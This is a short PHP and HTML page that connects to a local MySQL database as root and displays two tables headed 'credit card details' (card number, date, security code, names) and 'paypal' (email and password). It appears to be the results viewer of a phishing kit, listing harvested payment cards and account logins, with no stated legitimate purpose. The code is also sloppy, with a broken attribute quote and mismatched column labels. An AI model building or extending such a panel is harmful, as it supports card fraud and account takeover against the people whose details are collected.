
<html>

<head>

<style>

body{
	background-color:blue;
	
}


#table11{
	margin-left:550px;
	
	
}
.table1{
	
	margin-top:20px;
	margin-left:550px;
	
	
}

td{
	background-color:white;
	
}

th{
color:white;
	
}

</style>

</head>
<body>


<div id="table11">

		<h1> credit card details</h1>
	
		<table border="3"   class="table2>
		
		
			<tr  class="heading">
				
				<th>card</th>
				<th>date</th>
				<th>code</th>
				<th>last name</th>
				
				
			</tr>
		
	
	
	
		<?php


	$con = mysqli_connect('127.0.0.1','root','');
	
	if (!$con)
	{
			echo"not connected to server";
	}
	else{
	
	echo"";
	}
	
	
	if( !mysqli_select_db  ($con,'ddl') )
	{
		echo "databace not selected";
	}else{
		echo" ";
	}

?>
	
	
	<?php
	
	
	
	
		$sql="SELECT `card`, `date`, `code`, `fname`, `lname` FROM `credit`";

	
	$results=$con->query($sql);
	
	if ($results->num_rows>0)
	{
		while($row = $results->fetch_assoc())
		{
				echo "<tr> <td>  "  .$row["card"]."</td>   <td>".$row["date"]."</td>       <td>" .$row["code"]."</td>      <td>" .$row["fname"]."</td>        </tr>";
			
		}
		
	}
	else
		{
				ECHO"0 RESULTS";
		}
		
	
	
	
	
?>
			
				
</table>

</div>




































		<table border="3"  class="table1">
		
			<h1><center><b>paypal</b></center></h1>
		
			<tr  class="heading">
				
				<th>email</th>
				<th>password</th>
				
				
				
			</tr>
		
	
	
	
		<?php


	$con = mysqli_connect('127.0.0.1','root','');
	
	if (!$con)
	{
			echo"not connected to server";
	}
	else{
	
	echo"";
	}
	
	
	if( !mysqli_select_db  ($con,'ddl') )
	{
		echo "databace not selected";
	}else{
		echo" ";
	}

?>
	
	
	<?php
	
	
	
	
		$sql="SELECT `email`, `passwod` FROM `paypal` ";

	
	$results=$con->query($sql);
	
	if ($results->num_rows>0)
	{
		while($row = $results->fetch_assoc())
		{
				echo "<tr> <td>  "  .$row["email"]."</td>   <td>".$row["passwod"]."</td>              </tr>";
			
		}
		
	}
	else
		{
				ECHO"0 RESULTS";
		}
		
	
	
	
	
?>
			
				
</table>













</body>


</html>